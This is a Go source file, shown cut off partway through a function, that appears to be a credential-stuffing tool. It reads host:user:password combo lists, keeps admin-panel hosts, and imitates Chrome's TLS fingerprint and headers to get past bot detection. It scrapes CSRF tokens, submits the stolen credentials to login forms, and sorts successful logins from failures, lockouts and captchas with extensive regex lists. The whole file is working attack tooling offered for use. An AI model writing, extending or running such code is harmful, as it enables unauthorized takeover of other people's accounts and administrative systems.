package main

import (
	"bufio"
	"flag"
	"fmt"
	"io"
	"net/url"
	"os"
	"regexp"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	fhttp "github.com/bogdanfinn/fhttp"
	tls_client "github.com/bogdanfinn/tls-client"
	"github.com/bogdanfinn/tls-client/profiles"
)

type Credential struct {
	Raw      string
	Host     string
	User     string
	Password string
	URL      string
}

func parseCredential(line string) (Credential, bool) {
	line = strings.TrimSpace(line)
	if line == "" || strings.HasPrefix(line, "#") {
		return Credential{}, false
	}
	parts := strings.SplitN(line, ":", 3)
	if len(parts) != 3 {
		return Credential{}, false
	}
	host := strings.TrimSpace(parts[0])
	user := strings.TrimSpace(parts[1])
	pass := strings.TrimSpace(parts[2])
	if host == "" || user == "" || pass == "" {
		return Credential{}, false
	}
	return Credential{Raw: line, Host: host, User: user, Password: pass}, true
}

var adminRe = regexp.MustCompile(`(?i)(^admin[.\-]|[.\-/]admin[.\-/]|[.\-/]admin$|^admin$)`)
var validTLDRe = regexp.MustCompile(`(?i)\.[a-z]{2,6}$`)
var knownFakeTLDs = regexp.MustCompile(`(?i)\.(cgi|conf|log|txt|php|asp|aspx|html|htm|js|css|xml|json|bak|old|tmp|ini|cfg|sh|py|rb|pl|exe|dll|bin|dat|db|sql|zip|tar|gz|rar|7z|pdf|doc|xls|ppt|png|jpg|gif|ico|svg|woff|ttf|eot)$`)

func isAdminHost(host string) bool {
	h, _, _ := strings.Cut(host, ":")
	if !adminRe.MatchString(h) {
		return false
	}
	if !validTLDRe.MatchString(h) {
		return false
	}
	if knownFakeTLDs.MatchString(h) {
		return false
	}
	dotIdx := strings.Index(h, ".")
	if dotIdx < 0 || dotIdx == len(h)-1 {
		return false
	}
	return true
}

func buildURL(host string) string {
	h := host
	if !strings.HasPrefix(h, "http://") && !strings.HasPrefix(h, "https://") {
		h = "https://" + h
	}
	u, err := url.Parse(h)
	if err != nil {
		return ""
	}
	if !strings.Contains(u.Hostname(), ".") {
		return ""
	}
	return u.String()
}

func loadAndClean(path string) ([]Credential, error) {
	f, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer f.Close()

	seen := map[string]bool{}
	var out []Credential
	sc := bufio.NewScanner(f)
	for sc.Scan() {
		c, ok := parseCredential(sc.Text())
		if !ok {
			continue
		}
		if !isAdminHost(c.Host) {
			continue
		}
		rawURL := buildURL(c.Host)
		if rawURL == "" {
			continue
		}
		key := strings.ToLower(rawURL) + "|" + strings.ToLower(c.User)
		if seen[key] {
			continue
		}
		seen[key] = true
		c.URL = rawURL
		out = append(out, c)
	}
	return out, sc.Err()
}

func writeBack(path string, creds []Credential) error {
	f, err := os.Create(path)
	if err != nil {
		return err
	}
	defer f.Close()
	w := bufio.NewWriter(f)
	for _, c := range creds {
		fmt.Fprintln(w, c.Raw)
	}
	return w.Flush()
}

type inputTag struct {
	typ   string
	name  string
	id    string
	value string
	attrs string
}

var inputTagRe = regexp.MustCompile(`(?is)<input([^>]*?)(?:/>|>)`)
var attrRe = regexp.MustCompile(`(?i)(\w[\w-]*)(?:\s*=\s*(?:"([^"]*)"|'([^']*)'|(\S+)))?`)

func parseInputTags(html string) []inputTag {
	var out []inputTag
	for _, m := range inputTagRe.FindAllStringSubmatch(html, -1) {
		attrs := m[1]
		t := inputTag{attrs: attrs}
		for _, am := range attrRe.FindAllStringSubmatch(attrs, -1) {
			val := am[2]
			if val == "" {
				val = am[3]
			}
			if val == "" {
				val = am[4]
			}
			switch strings.ToLower(am[1]) {
			case "type":
				t.typ = strings.ToLower(val)
			case "name":
				t.name = val
			case "id":
				t.id = val
			case "value":
				t.value = val
			}
		}
		out = append(out, t)
	}
	return out
}

var emailNameRe = regexp.MustCompile(`(?i)^(email|mail|e.mail|user.?email|login.?email|emailaddress|login|username|user.?name|user|userid|user.?id|account|signin|sign.?in|auth.?email|uname|identifier|handle|correo|courriel|eposta|loginid|log.?in|member)$`)
var passNameRe = regexp.MustCompile(`(?i)^(password|passwd|pass|pwd|user.?pass|login.?pass|auth.?pass|secret|contraseña|parola|senha|wachtwoord|passwort|sifre|kodeord|passord|salasana|parol|heslo|jelszó)$`)

func isEmailField(t inputTag) bool {
	if t.typ == "email" {
		return true
	}
	if t.typ != "" && t.typ != "text" && t.typ != "tel" {
		return false
	}
	return emailNameRe.MatchString(t.name) || emailNameRe.MatchString(t.id)
}

func isPassField(t inputTag) bool {
	if t.typ == "password" {
		return true
	}
	return passNameRe.MatchString(t.name) || passNameRe.MatchString(t.id)
}

func hasLoginForm(tags []inputTag) bool {
	var foundEmail, foundPass bool
	for _, t := range tags {
		if isEmailField(t) {
			foundEmail = true
		}
		if isPassField(t) {
			foundPass = true
		}
	}
	return foundEmail && foundPass
}

func fieldNames(tags []inputTag) (emailField, passField string) {
	for _, t := range tags {
		if emailField == "" && isEmailField(t) && t.name != "" {
			emailField = t.name
		}
		if passField == "" && isPassField(t) && t.name != "" {
			passField = t.name
		}
	}
	if emailField == "" {
		emailField = "email"
	}
	if passField == "" {
		passField = "password"
	}
	return
}

func hiddenFields(tags []inputTag) map[string]string {
	out := map[string]string{}
	for _, t := range tags {
		if t.typ == "hidden" && t.name != "" {
			out[t.name] = t.value
		}
	}
	return out
}

var tokenNameRe = regexp.MustCompile(`(?i)(` +
	`__RequestVerificationToken|__VIEWSTATE|__VIEWSTATEGENERATOR|__EVENTVALIDATION|__EVENTTARGET|__EVENTARGUMENT|__PREVIOUSPAGE|__SCROLLPOSITIONX|__SCROLLPOSITIONY|` +
	`csrfmiddlewaretoken|csrf_token|_csrf_token|csrf|` +
	`_token|csrf_field|authenticity_token|form_token|form_key|` +
	`authenticity_token|utf8|` +
	`token|_token|security_token|anti_csrf|anticsrf|xsrf_token|xsrf|` +
	`_wpnonce|wpnonce|nonce|` +
	`_csrf_token|_csrf|` +
	`_csrf|CSRFToken|csrfToken|X-CSRF-TOKEN|` +
	`_csrfToken|` +
	`[0-9a-f]{32}|` +
	`form_token|form_build_id|form_id|` +
	`form_key|` +
	`struts\.token|struts\.token\.name|` +
	`ci_csrf_token|csrf_test_name|` +
	`verify_token|verification_token|request_token|page_token|session_token|` +
	`_xsrf|xsrftoken|__token|_verification_token|__nonce|request_verification_token` +
	`)`)

var metaTokenRe = regexp.MustCompile(`(?i)<meta[^>]+name\s*=\s*["']([^"']*(?:csrf|token|xsrf|nonce|verification)[^"']*)["'][^>]+content\s*=\s*["']([^"']+)["']`)
var metaTokenRe2 = regexp.MustCompile(`(?i)<meta[^>]+content\s*=\s*["']([^"']+)["'][^>]+name\s*=\s*["']([^"']*(?:csrf|token|xsrf|nonce|verification)[^"']*)["']`)

var jsTokenRe = []*regexp.Regexp{
	regexp.MustCompile(`(?i)(?:var|let|const)\s+(?:csrf|xsrf|token|nonce|verification)[_\w]*\s*=\s*["']([^"']{8,})["']`),
	regexp.MustCompile(`(?i)window\.(?:csrf|xsrf|token|nonce)[_\w]*\s*=\s*["']([^"']{8,})["']`),
	regexp.MustCompile(`(?i)["'](?:csrf|xsrf|_?token|nonce|verification)[_\w]*["']\s*:\s*["']([^"']{8,})["']`),
	regexp.MustCompile(`(?i)data-(?:csrf|xsrf|token|nonce)[_\-\w]*\s*=\s*["']([^"']{8,})["']`),
	regexp.MustCompile(`(?i)["']X-(?:CSRF|XSRF)-Token["']\s*:\s*["']([^"']{8,})["']`),
	regexp.MustCompile(`(?i)headers\s*:\s*\{[^}]*["']X-(?:CSRF|XSRF)-TOKEN["']\s*:\s*["']([^"']{8,})["']`),
	regexp.MustCompile(`(?i)__RequestVerificationToken["'\s]*[=:]\s*["']([^"']{8,})["']`),
}

func extractAllTokens(html string, fields map[string]string) {
	for _, m := range metaTokenRe.FindAllStringSubmatch(html, -1) {
		if len(m) == 3 && m[2] != "" {
			fields[m[1]] = m[2]
		}
	}
	for _, m := range metaTokenRe2.FindAllStringSubmatch(html, -1) {
		if len(m) == 3 && m[1] != "" {
			fields[m[2]] = m[1]
		}
	}

	for _, p := range jsTokenRe {
		m := p.FindStringSubmatch(html)
		if len(m) == 2 && m[1] != "" {
			nm := p.FindStringSubmatch(html)
			if len(nm) >= 2 {
				fullMatch := p.FindString(html)
				keyRe := regexp.MustCompile(`(?i)(csrf|xsrf|token|nonce|verification|__RequestVerificationToken)[_\-\w]*`)
				key := keyRe.FindString(fullMatch)
				if key == "" {
					key = "csrf_token"
				}
				if _, exists := fields[key]; !exists {
					fields[key] = nm[1]
				}
			}
		}
	}
}

var formActionRe = regexp.MustCompile(`(?is)<form[^>]+>`)
var actionAttrRe = regexp.MustCompile(`(?i)action\s*=\s*(?:"([^"]*)"|'([^']*)'|(\S+))`)

func extractFormAction(html string) string {
	tag := formActionRe.FindString(html)
	if tag == "" {
		return ""
	}
	m := actionAttrRe.FindStringSubmatch(tag)
	if len(m) < 2 {
		return ""
	}
	for _, v := range m[1:] {
		if v != "" {
			return v
		}
	}
	return ""
}

func resolveAction(base, action string) string {
	if action == "" {
		return base
	}
	if strings.HasPrefix(action, "http://") || strings.HasPrefix(action, "https://") {
		return action
	}
	u, err := url.Parse(base)
	if err != nil {
		return base
	}
	ref, err := url.Parse(action)
	if err != nil {
		return base
	}
	return u.ResolveReference(ref).String()
}

func chromeHeaders(referer string) fhttp.Header {
	h := fhttp.Header{
		"sec-ch-ua":                 []string{`"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"`},
		"sec-ch-ua-mobile":          []string{"?0"},
		"sec-ch-ua-platform":        []string{`"Windows"`},
		"upgrade-insecure-requests": []string{"1"},
		"user-agent":                []string{"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"},
		"accept":                    []string{"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"},
		"sec-fetch-site":            []string{"none"},
		"sec-fetch-mode":            []string{"navigate"},
		"sec-fetch-user":            []string{"?1"},
		"sec-fetch-dest":            []string{"document"},
		"accept-encoding":           []string{"gzip, deflate, br, zstd"},
		"accept-language":           []string{"en-US,en;q=0.9"},
		"priority":                  []string{"u=0, i"},
	}
	if referer != "" {
		h["referer"] = []string{referer}
		h["sec-fetch-site"] = []string{"same-origin"}
	}
	order := []string{
		"sec-ch-ua", "sec-ch-ua-mobile", "sec-ch-ua-platform",
		"upgrade-insecure-requests", "user-agent", "accept",
		"sec-fetch-site", "sec-fetch-mode", "sec-fetch-user", "sec-fetch-dest",
		"accept-encoding", "accept-language", "priority",
	}
	if referer != "" {
		order = append(order, "referer")
	}
	h[fhttp.HeaderOrderKey] = order
	h[fhttp.PHeaderOrderKey] = []string{":method", ":authority", ":scheme", ":path"}
	return h
}

func chromePostHeaders(referer string) fhttp.Header {
	h := fhttp.Header{
		"sec-ch-ua":                 []string{`"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"`},
		"sec-ch-ua-mobile":          []string{"?0"},
		"sec-ch-ua-platform":        []string{`"Windows"`},
		"upgrade-insecure-requests": []string{"1"},
		"origin":                    []string{referer},
		"content-type":              []string{"application/x-www-form-urlencoded"},
		"user-agent":                []string{"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"},
		"accept":                    []string{"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"},
		"sec-fetch-site":            []string{"same-origin"},
		"sec-fetch-mode":            []string{"navigate"},
		"sec-fetch-user":            []string{"?1"},
		"sec-fetch-dest":            []string{"document"},
		"referer":                   []string{referer},
		"accept-encoding":           []string{"gzip, deflate, br, zstd"},
		"accept-language":           []string{"en-US,en;q=0.9"},
		"priority":                  []string{"u=0, i"},
	}
	h[fhttp.HeaderOrderKey] = []string{
		"sec-ch-ua", "sec-ch-ua-mobile", "sec-ch-ua-platform",
		"upgrade-insecure-requests", "origin", "content-type",
		"user-agent", "accept",
		"sec-fetch-site", "sec-fetch-mode", "sec-fetch-user", "sec-fetch-dest",
		"referer", "accept-encoding", "accept-language", "priority",
	}
	h[fhttp.PHeaderOrderKey] = []string{":method", ":authority", ":scheme", ":path"}
	return h
}

func newGETClient() (tls_client.HttpClient, error) {
	opts := []tls_client.HttpClientOption{
		tls_client.WithTimeoutSeconds(8),
		tls_client.WithClientProfile(profiles.Chrome_133),
		tls_client.WithInsecureSkipVerify(),
	}
	return tls_client.NewHttpClient(tls_client.NewNoopLogger(), opts...)
}

func newPOSTClient() (tls_client.HttpClient, error) {
	opts := []tls_client.HttpClientOption{
		tls_client.WithTimeoutSeconds(8),
		tls_client.WithClientProfile(profiles.Chrome_133),
		tls_client.WithNotFollowRedirects(),
		tls_client.WithInsecureSkipVerify(),
	}
	return tls_client.NewHttpClient(tls_client.NewNoopLogger(), opts...)
}

func doGET(client tls_client.HttpClient, targetURL string) (int, string, []*fhttp.Cookie, error) {
	return doGETWithCookies(client, targetURL, nil)
}

func doGETWithCookies(client tls_client.HttpClient, targetURL string, cookies []*fhttp.Cookie) (int, string, []*fhttp.Cookie, error) {
	req, err := fhttp.NewRequest("GET", targetURL, nil)
	if err != nil {
		return 0, "", nil, err
	}
	req.Header = chromeHeaders("")
	for _, c := range cookies {
		req.AddCookie(c)
	}
	resp, err := client.Do(req)
	if err != nil {
		return 0, "", nil, err
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	all := append(cookies, resp.Cookies()...)
	return resp.StatusCode, string(body), all, nil
}

type postResult struct {
	code     int
	body     string
	location string
	cookies  []*fhttp.Cookie
}

func doPOST(client tls_client.HttpClient, actionURL string, data url.Values, cookies []*fhttp.Cookie, referer string) (postResult, error) {
	req, err := fhttp.NewRequest("POST", actionURL, strings.NewReader(data.Encode()))
	if err != nil {
		return postResult{}, err
	}
	req.Header = chromePostHeaders(referer)
	for _, c := range cookies {
		req.AddCookie(c)
	}
	resp, err := client.Do(req)
	if err != nil {
		return postResult{}, err
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	loc := resp.Header.Get("Location")
	return postResult{code: resp.StatusCode, body: string(body), location: loc, cookies: resp.Cookies()}, nil
}

var successPatterns = []*regexp.Regexp{
	regexp.MustCompile(`(?i)<a[^>]+(href|onclick)[^>]*(logout|log.?out|sign.?out|signout|log_out|end.?session|deauth)[^>]*>`),
	regexp.MustCompile(`(?i)(href|action)\s*=\s*["'][^"']{0,100}(logout|log.?out|sign.?out|signout|deauth|end.?session)[^"']{0,50}["']`),
	regexp.MustCompile(`(?i)<(nav|header|aside|div)[^>]*(dashboard|admin.?nav|user.?menu|account.?menu|main.?menu)[^>]*>`),
	regexp.MustCompile(`(?i)(id|class)\s*=\s*["'][^"']*(dashboard|admin.?panel|user.?panel|control.?panel|management|account.?header|user.?header)[^"']*["']`),
	regexp.MustCompile(`(?i)(welcome\s+back|welcome,?\s+\w|hello,?\s+\w|hi,?\s+\w|good\s+(morning|afternoon|evening),?\s+\w)`),
	regexp.MustCompile(`(?i)(logged\s+in\s+as|signed\s+in\s+as|you\s+are\s+(logged|signed)\s+in)`),
	regexp.MustCompile(`(?i)(login.?success(ful)?|sign.?in.?success(ful)?|authentication.?success(ful)?)`),
	regexp.MustCompile(`(?i)(successfully.?(logged|signed|authenticated|authorized|accessed))`),
	regexp.MustCompile(`(?i)(access.?granted|you.?now.?have.?access)`),
	regexp.MustCompile(`(?i)"(access_token|auth_token|id_token|jwt|bearer_token)"\s*:\s*"[^"]{16,}"`),
	regexp.MustCompile(`(?i)"(success|authenticated|loggedIn|logged_in|isLoggedIn|is_logged_in)"\s*:\s*(true|1|"true"|"1")`),
	regexp.MustCompile(`(?i)"status"\s*:\s*"(ok|success|authenticated|logged_in)"`),
	regexp.MustCompile(`(?i)"(message|msg)"\s*:\s*"(success(fully)?|logged.?in|welcome|authenticated|authorized)"`),
	regexp.MustCompile(`(?i)localStorage\.setItem\s*\(\s*["'](token|access_token|auth_token|jwt|session)[^"']*["']`),
	regexp.MustCompile(`(?i)sessionStorage\.setItem\s*\(\s*["'](token|access_token|auth_token|jwt|session)[^"']*["']`),
	regexp.MustCompile(`(?i)<(h1|h2|title)[^>]*>(admin|administration|dashboard|control\s+panel|management\s+console|welcome)[^<]{0,60}</(h1|h2|title)>`),
}

var failPatterns = []*regexp.Regexp{
	regexp.MustCompile(`(?i)class\s*=\s*["'][^"']*validation.?summary.?errors[^"']*["']`),
	regexp.MustCompile(`(?i)class\s*=\s*["'][^"']*validation.?summary[^"']*["'][^>]*>.{0,500}(error|invalid|wrong|fail|incorrect|denied|match)`),
	regexp.MustCompile(`(?i)class\s*=\s*["'][^"']*(alert.?danger|alert.?error|alert.?warning|error.?message|login.?error|auth.?error|form.?error|field.?error|input.?error|has.?error|is.?invalid|text.?danger|text.?error|callout.?danger)[^"']*["']`),
	regexp.MustCompile(`(?i)(id|class)\s*=\s*["'][^"']*(error.?container|error.?box|error.?panel|error.?block|error.?summary|error.?list|flash.?error|notice.?error|message.?error|status.?error)[^"']*["']`),
	regexp.MustCompile(`(?i)class\s*=\s*["'][^"']*text.?red[^"']*["'][^>]*>.{0,300}(credential|password|login|email|user|match|wrong|invalid|incorrect|denied)`),
	regexp.MustCompile(`(?i)<[^>]+class\s*=\s*["'][^"']*bg.?red[^"']*["'][^>]*>`),
	regexp.MustCompile(`(?i)<div[^>]+class\s*=\s*["'][^"']*(alert|notification|message)[^"']*danger[^"']*["']`),
	regexp.MustCompile(`(?i)<div[^>]+class\s*=\s*["'][^"']*danger[^"']*["'][^>]*>.{0,400}(login|password|credential|email|user|account)`),
	regexp.MustCompile(`(?i)these\s+credentials\s+do\s+not\s+match`),
	regexp.MustCompile(`(?i)(email\s+(address|addr)?\s*(or|and|/)\s*(phone\s+(number)?|mobile)?\s*(and|or|/)\s*password\s+do\s+not\s+match)`),
	regexp.MustCompile(`(?i)whoops.{0,30}something\s+went\s+wrong`),
	regexp.MustCompile(`(?i)(invalid|incorrect|wrong|bad|mismatch).{0,80}(password|passwd|pass|pwd|credential|secret|pin|passcode|passphrase)`),
	regexp.MustCompile(`(?i)(invalid|incorrect|wrong|bad).{0,80}(email|e.?mail|username|user.?name|user|login|account|identifier|id)`),
	regexp.MustCompile(`(?i)(password|passwd|credential|secret).{0,80}(invalid|incorrect|wrong|bad|not.?match|does.?not.?match|mismatch|do.?not.?match)`),
	regexp.MustCompile(`(?i)(email|username|user|login|account).{0,80}(invalid|incorrect|wrong|not.?found|not.?exist|unknown|unrecognized|not.?registered)`),
	regexp.MustCompile(`(?i)(invalid|incorrect|wrong|bad).{0,30}(login|credentials?|details?|information|combination)`),
	regexp.MustCompile(`(?i)(invalid\.credentials?|wrong\.credentials?|bad\.credentials?)`),
	regexp.MustCompile(`(?i)(invalid.?credentials?|wrong.?credentials?|bad.?credentials?|incorrect.?credentials?|failed.?credentials?)`),
	regexp.MustCompile(`(?i)(authentication.?(failed|failure|error|invalid|unsuccessful)|login.?(failed|failure|error|invalid|unsuccessful))`),
	regexp.MustCompile(`(?i)(sign.?in.?(failed|failure|error|unsuccessful)|signin.?(failed|failure|error|unsuccessful))`),
	regexp.MustCompile(`(?i)(login\s+attempt\s+(failed|unsuccessful)|failed\s+login\s+attempt)`),
	regexp.MustCompile(`(?i)(could\s+not\s+(log|sign)\s+(you\s+)?in|unable\s+to\s+(log|sign)\s+(you\s+)?in)`),
	regexp.MustCompile(`(?i)(credentials?.{0,20}(not\s+valid|not\s+correct|not\s+recognised|not\s+recognized|not\s+found|do\s+not\s+match|don.t\s+match))`),
	regexp.MustCompile(`(?i)(not\s+match\s+(our\s+)?(records?|database|system|accounts?))`),
	regexp.MustCompile(`(?i)(do\s+not\s+match\s+(our\s+)?(records?|database|system|accounts?))`),
	regexp.MustCompile(`(?i)(access.?(denied|refused|forbidden|rejected|not.?allowed|revoked))`),
	regexp.MustCompile(`(?i)(not.?authorized|unauthorized|unauthenticated|permission\s+denied|insufficient\s+permissions?)`),
	regexp.MustCompile(`(?i)<title>[^<]*(403|401|access\s+denied|forbidden|unauthorized)[^<]*</title>`),
	regexp.MustCompile(`(?i)(account|user|email|login|member).{0,60}(does.?not.?exist|not.?found|not.?registered|not.?recognized|doesn.t\s+exist|no\s+account)`),
	regexp.MustCompile(`(?i)(no.{0,20}(user|account|member|email).{0,30}(found|exists?|registered|with\s+that))`),
	regexp.MustCompile(`(?i)(could.?not.?find.{0,40}(user|account|email|member))`),
	regexp.MustCompile(`(?i)(this\s+account\s+does\s+not\s+exist|no\s+account\s+found|account\s+not\s+found)`),
	regexp.MustCompile(`(?i)(we\s+couldn.?t\s+find\s+(an?\s+)?(user|account|member|email))`),
	regexp.MustCompile(`(?i)(the\s+(email|username|user|account).{0,30}(not\s+found|doesn.t\s+exist|does\s+not\s+exist|is\s+not\s+registered))`),
	regexp.MustCompile(`(?i)(account.{0,40}(locked|suspended|disabled|banned|deactivated|blocked|closed|terminated|frozen|restricted))`),
	regexp.MustCompile(`(?i)(your.{0,30}account.{0,40}(locked|suspended|disabled|banned|blocked|deactivated|closed))`),
	regexp.MustCompile(`(?i)(too\s+many\s+(failed\s+)?(login\s+)?(attempts?|tries|failures?)|maximum\s+(login\s+)?attempts?\s+(reached|exceeded))`),
	regexp.MustCompile(`(?i)(rate.?limit(ed|ing)?|try.?again.?later|wait.{0,30}before.{0,30}(trying|attempting)|please\s+wait)`),
	regexp.MustCompile(`(?i)(temporarily.?(blocked|locked|disabled|suspended|banned|unavailable))`),
	regexp.MustCompile(`(?i)(account.{0,30}has.{0,20}been.{0,20}(locked|suspended|disabled|banned|blocked|terminated))`),
	regexp.MustCompile(`(?i)(password.{0,60}(expired|reset.?required|must\s+be\s+changed?|needs?\s+to\s+be\s+changed?|has\s+expired))`),
	regexp.MustCompile(`(?i)(your.{0,30}password.{0,60}(expired|has\s+expired|must\s+change|needs?\s+changing))`),
	regexp.MustCompile(`(?i)(please.{0,50}(check|verify|confirm|review).{0,50}(password|credential|email|login|details|information))`),
	regexp.MustCompile(`(?i)(try.?again|please.?try|re.?enter|re.?type).{0,80}(password|credential|details|login|email)`),
	regexp.MustCompile(`(?i)(forgot.?your.?password|reset.?your.?password|password.?recovery)`),
	regexp.MustCompile(`(?i)"status"\s*:\s*"?(error|fail(ed)?|false|0|invalid|unauthorized|forbidden|unauthenticated)"?`),
	regexp.MustCompile(`(?i)"(success|authenticated|loggedIn|logged_in|is_?logged_?in)"\s*:\s*(false|0|"false"|"0"|null)`),
	regexp.MustCompile(`(?i)"(error|err|message|msg|detail|reason|description)"\s*:\s*"[^"]{0,300}(invalid|incorrect|wrong|bad|failed|denied|unauthorized|not.?found|not.?exist|mismatch|do.?not.?match|locked|suspended|expired|blocked|forbidden|credentials?)[^"]{0,300}"`),
	regexp.MustCompile(`(?i)"(code|error_?code|status_?code|http_?code)"\s*:\s*"?(401|403|404|422|423|429|"401"|"403"|"404"|"422"|"423"|"429")"?`),
	regexp.MustCompile(`(?i)"(type|error_?type|error_?name)"\s*:\s*"(AuthenticationError|AuthError|InvalidCredentials?|LoginError|Unauthorized|AccessDenied|Forbidden|NotFound|UserNotFound|AccountLocked|AccountDisabled)"`),
	regexp.MustCompile(`(?i)"errors?"\s*:\s*[\[{][^}\]]{0,500}(password|email|credential|login|user)[^}\]]{0,500}[\]}]`),
	regexp.MustCompile(`(?i)^(error|fail(ed)?|invalid|unauthorized|forbidden|denied|rejected)\s*[:\-]`),
	regexp.MustCompile(`(?i)(Login\s+failed|Sign.?in\s+failed|Auth\s+failed|Authentication\s+failed)`),
	regexp.MustCompile(`(?i)(HTTP\s+401|HTTP\s+403|401\s+Unauthorized|403\s+Forbidden)`),
	regexp.MustCompile(`(?i)(These\s+credentials\s+do\s+not\s+match\s+our\s+records)`),
	regexp.MustCompile(`(?i)class\s*=\s*["'][^"']*text.?danger[^"']*["'][^>]*>.{0,300}(password|email|credential|login|match|invalid|incorrect)`),
	regexp.MustCompile(`(?i)(Please\s+enter\s+a\s+correct\s+(username|email).{0,60}password)`),
	regexp.MustCompile(`(?i)(Your\s+(username|email)\s+and\s+password\s+didn.?t\s+match)`),
	regexp.MustCompile(`(?i)(The\s+password\s+you\s+entered\s+for\s+the\s+(username|email))`),
	regexp.MustCompile(`(?i)(Error:\s*<strong>[^<]*</strong>\s*is\s+not\s+registered)`),
	regexp.MustCompile(`(?i)(Unknown\s+username|Incorrect\s+password\.\s+<a[^>]*>Lost\s+your\s+password)`),
	regexp.MustCompile(`(?i)(Username\s+and\s+password\s+do\s+not\s+match|Invalid\s+login\s+credentials)`),
	regexp.MustCompile(`(?i)(Sorry,\s+(unrecognized\s+)?(username|email)\s+or\s+password)`),
	regexp.MustCompile(`(?i)(The\s+account\s+sign-in\s+was\s+incorrect|Invalid\s+login\s+or\s+password)`),
	regexp.MustCompile(`(?i)(Incorrect\s+email\s+or\s+password|We\s+can.?t\s+find\s+an\s+account\s+with\s+that\s+email)`),
	regexp.MustCompile(`(?i)(The\s+(username|password)\s+is\s+(incorrect|invalid|wrong))`),
	regexp.MustCompile(`(?i)(You\s+have\s+entered\s+an\s+invalid\s+username\s+or\s+password)`),
	regexp.MustCompile(`(?i)(Login\s+Details\s+Incorrect|Incorrect\s+Login\s+Details|The\s+details\s+you\s+entered\s+were\s+incorrect)`),
	regexp.MustCompile(`(?i)(Login\s+Attempt\s+Failed|The\s+login\s+is\s+invalid)`),
	regexp.MustCompile(`(?i)(The\s+(provided\s+)?(email|username|login).{0,30}(password|credentials?)\s+(are|is)\s+(invalid|incorrect|wrong|not\s+correct))`),
	regexp.MustCompile(`(?i)(<li>\s*(email\s+(address\s+or\s+)?|phone\s+(number\s+)?)?and\s+password\s+do\s+not\s+match|<li>\s*(invalid|incorrect|wrong).{0,80}(password|credential|email|login))`),
	regexp.MustCompile(`(?i)<li[^>]+class\s*=\s*["'][^"']*error[^"']*["'][^>]*>.{0,300}(username|email|password|credential|login|match|invalid|incorrect|wrong|didn.t|did\s+not)`),
	regexp.MustCompile(`(?i)(username\s+and\s+password\s+didn.?t\s+match|username\s+and\s+password\s+did\s+not\s+match)`),
	regexp.MustCompile(`(?i)(password\s+didn.?t\s+match|password\s+did\s+not\s+match|passwords?\s+don.?t\s+match|passwords?\s+do\s+not\s+match)`),
	regexp.MustCompile(`(?i)(your\s+(username|email|login)\s+and\s+password\s+didn.?t\s+match)`),
	regexp.MustCompile(`(?i)(please\s+try\s+again|try\s+again\.?\s*$)`),
	regexp.MustCompile(`(?i)(captcha|recaptcha|hcaptcha|turnstile|cf.?challenge|bot.?check|robot.?check|human.?verif|prove.?you.?are.?(human|not.?a.?bot)|i.?am.?not.?a.?robot)`),
	regexp.MustCompile(`(?i)(contraseña.{0,60}(incorrecta|inválida|error|no\s+coincide)|usuario.{0,60}(incorrecto|inválido|no\s+existe|no\s+encontrado))`),
	regexp.MustCompile(`(?i)(mot.?de.?passe.{0,60}(incorrect|invalide|erreur|ne\s+correspond)|identifiant.{0,60}(incorrect|invalide|inconnu|introuvable))`),
	regexp.MustCompile(`(?i)(senha.{0,60}(incorreta|inválida|erro|não\s+corresponde)|usuário.{0,60}(incorreto|inválido|não\s+existe|não\s+encontrado))`),
	regexp.MustCompile(`(?i)(passwort.{0,60}(falsch|ungültig|fehler|stimmt\s+nicht)|benutzername.{0,60}(falsch|ungültig|nicht\s+gefunden|existiert\s+nicht))`),
	regexp.MustCompile(`(?i)(password.{0,60}errata?|credenziali.{0,60}(errate|non\s+valide|non\s+corrette|non\s+trovate)|email.{0,60}non\s+trovata)`),
	regexp.MustCompile(`(?i)(wachtwoord.{0,60}(onjuist|ongeldig|fout|klopt\s+niet)|gebruikersnaam.{0,60}(onjuist|ongeldig|onbekend|niet\s+gevonden))`),
	regexp.MustCompile(`(?i)(şifre.{0,60}(hatalı|yanlış|geçersiz|uyuşmuyor)|kullanıcı.{0,60}(hatalı|yanlış|bulunamadı|mevcut\s+değil))`),
	regexp.MustCompile(`(?i)(пароль.{0,60}(неверн|неправильн|ошибк|не\s+совпад)|логин.{0,60}(неверн|неправильн|не\s+найден|не\s+существует))`),
	regexp.MustCompile(`(?i)(密码.{0,20}(错误|不正确|不匹配)|用户名.{0,20}(错误|不存在|未找到))`),
	regexp.MustCompile(`(?i)(パスワード.{0,20}(が違|誤り|一致しない)|ユーザー名.{0,20}(が違|存在しない|見つからない))`),
	regexp.MustCompile(`(?i)(비밀번호.{0,20}(틀렸|잘못|일치하지)|이메일.{0,20}(틀렸|없는|찾을\s+수\s+없))`),
}

var htmlEntityReplacer = strings.NewReplacer(
	"&#x27;", "'", "&#39;", "'", "&apos;", "'",
	"&#x22;", `"`, "&#34;", `"`, "&quot;", `"`,
	"&amp;", "&", "&#38;", "&",
	"&lt;", "<", "&#60;", "<",
	"&gt;", ">", "&#62;", ">",
	"&nbsp;", " ", "&#160;", " ",
	"&ndash;", "-", "&#8211;", "-",
	"&mdash;", "--", "&#8212;", "--",
	"&#x2F;", "/", "&#47;", "/",
)

func decodeHTML(s string) string {
	return htmlEntityReplacer.Replace(s)
}

func isSuccess(code int, body string) bool {
	decoded := decodeHTML(body)
	for _, p := range failPatterns {
		if p.MatchString(decoded) {
			return false
		}
	}
	if code == 200 {
		for _, p := range successPatterns {
			if p.MatchString(decoded) {
				return true
			}
		}
	}
	return false
}

var badRedirectQueryRe = regexp.MustCompile(`(?i)[?&](error|err|failed|fail|invalid|incorrect|wrong|denied|reject)\s*=`)

func isBadRedirect(location, postURL string) bool {
	if location == "" {
		return false
	}
	locU, err := url.Parse(location)
	postU, err2 := url.Parse(postURL)
	if err == nil && err2 == nil {
